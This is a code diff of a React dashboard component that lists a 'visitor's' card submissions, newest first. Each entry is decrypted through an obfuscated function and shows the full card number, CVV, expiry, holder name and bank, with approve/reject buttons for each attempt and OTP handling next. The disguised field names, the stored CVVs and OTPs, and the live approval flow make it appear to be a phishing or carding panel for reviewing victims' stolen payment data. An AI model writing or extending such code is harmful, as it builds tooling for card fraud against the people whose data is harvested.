@@ -230,30 +230,27 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
   }
 
   // 4. Payment & Verification Data
-  // Always show current data only (no history)
-  const hasMultipleAttempts = false // Always false - we don't show history
+  // Show ALL card attempts from history (newest first)
   
-  // if (hasMultipleAttempts) {
-  //   // Show all attempts from history
-  //   const historyBubbles = convertHistoryToBubbles(history)
-  //   bubbles.push(...historyBubbles)
-  // } else {
-    // Show current data
-    
-    // Card Info - check history first, then fallback to direct fields
-    const latestCardHistory = visitor.history?.find((h: any) => h.type === '_t1' || h.type === 'card')
-    
-    console.log('[Dashboard] History:', visitor.history)
-    console.log('[Dashboard] Latest card history:', latestCardHistory)
-    console.log('[Dashboard] Direct fields:', { _v1: visitor._v1, _v2: visitor._v2, _v3: visitor._v3, _v4: visitor._v4 })
-    
-    // Get encrypted values
-    const encryptedCardNumber = latestCardHistory?.data?._v1 || visitor._v1 || visitor.cardNumber
-    const encryptedCvv = latestCardHistory?.data?._v2 || visitor._v2 || visitor.cvv
-    const encryptedExpiryDate = latestCardHistory?.data?._v3 || visitor._v3 || visitor.expiryDate
-    const encryptedCardHolderName = latestCardHistory?.data?._v4 || visitor._v4 || visitor.cardHolderName
-    
-    console.log('[Dashboard] Encrypted values:', { cardNumber: encryptedCardNumber, cvv: encryptedCvv, expiryDate: encryptedExpiryDate, cardHolderName: encryptedCardHolderName })
+  // Get all card entries from history
+  const allCardHistory = visitor.history?.filter((h: any) => h.type === '_t1' || h.type === 'card') || []
+  
+  // Sort by timestamp (newest first)
+  const sortedCardHistory = allCardHistory.sort((a: any, b: any) => {
+    const timeA = new Date(a.timestamp).getTime()
+    const timeB = new Date(b.timestamp).getTime()
+    return timeB - timeA // Descending order (newest first)
+  })
+  
+  console.log('[Dashboard] All card history:', sortedCardHistory)
+  
+  // Create a bubble for each card attempt
+  sortedCardHistory.forEach((cardHistory: any, index: number) => {
+    // Get encrypted values from history
+    const encryptedCardNumber = cardHistory.data?._v1
+    const encryptedCvv = cardHistory.data?._v2
+    const encryptedExpiryDate = cardHistory.data?._v3
+    const encryptedCardHolderName = cardHistory.data?._v4
     
     // Decrypt values with error handling
     let cardNumber, cvv, expiryDate, cardHolderName
@@ -264,38 +261,38 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
       cardHolderName = encryptedCardHolderName ? _d(encryptedCardHolderName) : undefined
     } catch (error) {
       console.error('[Dashboard] Decryption error:', error)
-      // Fallback to encrypted values if decryption fails
       cardNumber = encryptedCardNumber
       cvv = encryptedCvv
       expiryDate = encryptedExpiryDate
       cardHolderName = encryptedCardHolderName
     }
     
-    console.log('[Dashboard] Decrypted values:', { cardNumber, cvv, expiryDate, cardHolderName })
+    // Show all cards, but hide action buttons if already actioned
+    const hasBeenActioned = cardHistory.status === 'approved' || cardHistory.status === 'rejected'
     
-    // Show card info if we have at least card number (encrypted or decrypted)
     if (cardNumber || encryptedCardNumber) {
       bubbles.push({
-        id: "card-info",
-        title: "معلومات البطاقة",
+        id: `card-info-${cardHistory.id || index}`,
+        title: index === 0 ? "معلومات البطاقة" : `معلومات البطاقة (محاولة ${sortedCardHistory.length - index})`,
         icon: "💳",
         color: "orange",
         data: {
           "رقم البطاقة": cardNumber,
           "اسم حامل البطاقة": cardHolderName || "غير محدد",
-          "نوع البطاقة": visitor.cardType || latestCardHistory?.data?.cardType,
+          "نوع البطاقة": cardHistory.data?.cardType,
           "تاريخ الانتهاء": expiryDate,
           "CVV": cvv,
-          "البنك": visitor.bankInfo?.name || latestCardHistory?.data?.bankInfo?.name || "غير محدد",
-          "بلد البنك": visitor.bankInfo?.country || latestCardHistory?.data?.bankInfo?.country || "غير محدد"
+          "البنك": cardHistory.data?.bankInfo?.name || "غير محدد",
+          "بلد البنك": cardHistory.data?.bankInfo?.country || "غير محدد"
         },
-        timestamp: visitor.cardUpdatedAt || visitor.updatedAt,
-        status: "pending" as const,
-        showActions: true,
-        isLatest: true,
+        timestamp: cardHistory.timestamp,
+        status: cardHistory.status || "pending" as const,
+        showActions: !hasBeenActioned, // Hide buttons if already approved/rejected
+        isLatest: index === 0,
         type: "card"
       })
     }
+  })
     
     // OTP Code - check history first
     const latestOtpHistory = visitor.history?.find((h: any) => h.entryType === '_t2' || h.entryType === 'otp')
